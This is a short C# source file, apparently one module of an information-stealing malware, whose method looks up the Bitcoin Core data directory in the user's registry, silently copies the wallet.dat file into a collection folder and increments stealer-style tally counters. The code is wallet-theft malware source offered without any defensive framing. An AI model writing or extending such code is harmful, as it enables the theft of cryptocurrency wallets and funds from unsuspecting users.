using Microsoft.Win32;
using System.IO;

namespace SHARP
{
    internal class BitcoinCore
    {
      public static void BCStr(string directorypath)
      {
        try
        {
          RegistryKey registryKey = Registry.CurrentUser.OpenSubKey("Software").OpenSubKey("Bitcoin").OpenSubKey("Bitcoin-Qt");
          Directory.CreateDirectory(directorypath + "\\Wallets\\BitcoinCore\\");
          File.Copy(registryKey.GetValue("strDataDir").ToString() + "\\wallet.dat", directorypath + "\\BitcoinCore\\wallet.dat");
          ++Counting.bitcoincore;
          ++Counting.Wallets;
        }
        catch
        {
        }
      }
    }
}
